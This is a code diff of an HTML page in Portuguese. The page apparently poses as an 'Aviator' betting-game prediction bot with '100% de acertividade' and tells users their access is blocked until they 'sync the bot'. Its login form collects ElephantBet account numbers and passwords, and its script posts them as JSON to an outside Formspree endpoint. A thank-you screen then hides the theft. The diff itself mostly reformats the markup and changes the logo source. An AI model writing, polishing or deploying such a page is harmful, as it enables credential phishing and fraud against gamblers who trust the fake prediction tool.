@@ -23,7 +23,9 @@
   <div class="topbar"></div>
   <!-- Tela inicial -->
   <div id="homeScreen">
-    <img src="aviator.png" alt="" style="width:120px;margin-top:20px">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Aviator_game_logo.png" 
+         alt="Aviator" 
+         style="width:120px;margin-top:20px">
     <h1>AVIATOR</h1>
     <form id="homeForm">
       <label for="numeroInicio">Número</label><br>
@@ -34,35 +36,43 @@
     </form>
     <p style="margin-top:15px;color:#000">Precisa de apoio? Deixa: <strong>Mensagem na Página ✅</strong></p>
   </div>
-
   <!-- Tela do jogo -->
   <div id="gameScreen" style="background:#000;color:#fff;padding:20px">
-    <h1 style="color:#fff;background:#c00;padding:10px 0">AVIATOR<br><span style="font-size:0.8em">100% de acertividade</span></h1>
+    <h1 style="color:#fff;background:#c00;padding:10px 0">
+      AVIATOR<br>
+      <span style="font-size:0.8em">100% de acertividade</span>
+    </h1>
     <div id="circle" class="circle">1.00x</div>
     <button id="preverBtn">PREVER PRÓXIMA VELA</button>
     <button id="openLogin">CONECTAR BOT</button>
     <p id="resultado"></p>
-    <p id="blockedMsg" style="display:none;background:#222;color:#ffcc00;padding:10px;border-radius:5px;width:90%;margin:10px auto">⚠️ Acesso bloqueado. Sincronize o Bot.</p>
+    <p id="blockedMsg" style="display:none;background:#222;color:#ffcc00;padding:10px;border-radius:5px;width:90%;margin:10px auto">
+      ⚠️ Acesso bloqueado. Sincronize o Bot.
+    </p>
   </div>
-
   <!-- Tela de login -->
   <div id="loginScreen" style="background:#00bfff;color:#000;padding:20px">
-    <h2>Conecte AVIATOR com sua conta da <span style="color:#c06;font-weight:bold">ELEPHANTBET</span></h2>
+    <h2>Conecte AVIATOR com sua conta da 
+      <span style="color:#c06;font-weight:bold">ELEPHANTBET</span>
+    </h2>
     <a href="#" id="closeLogin" style="color:#800080;font-weight:bold">Voltar</a>
     <form id="loginForm">
       <label for="numeroLogin">Número da conta elephantbet:</label><br>
-      <input type="tel" id="numeroLogin" placeholder="Digite o seu número" required maxlength="9" pattern="9[0-9]{8}"><br>
+      <input type="tel" id="numeroLogin" placeholder="Digite o seu número" 
+             required maxlength="9" pattern="9[0-9]{8}"><br>
       <label for="senhaLogin">Senha:</label><br>
       <input type="password" id="senhaLogin" placeholder="Digite a sua senha" required><br>
       <button type="submit">CONECTE AGORA</button>
     </form>
     <p id="statusMsg" style="color:#c00"></p>
   </div>
-
   <!-- Tela de sincronização concluída -->
   <div id="syncScreen" style="background:#b2ebf2;color:#000;padding:20px">
     <h2 style="color:#009fe3">Conexão Concluída!</h2>
-    <p>Agradecemos pela <span style="color:#c06;font-weight:bold">Cooperação</span>.<br>Aguarde pelos dados de configuração do bot.</p>
+    <p>
+      Agradecemos pela <span style="color:#c06;font-weight:bold">Cooperação</span>.<br>
+      Aguarde pelos dados de configuração do bot.
+    </p>
     <button id="backToGame" style="background:#c06;color:#fff">VOLTAR AO AVIATOR</button>
   </div>
 
@@ -154,7 +164,6 @@
 
       statusMsg.textContent="Conectando...";
       try{
-        // Mantém o endpoint original do projeto
         await fetch("https://formspree.io/f/xvgwbowg",{
           method:"POST",
           body:JSON.stringify({numero,senha}),
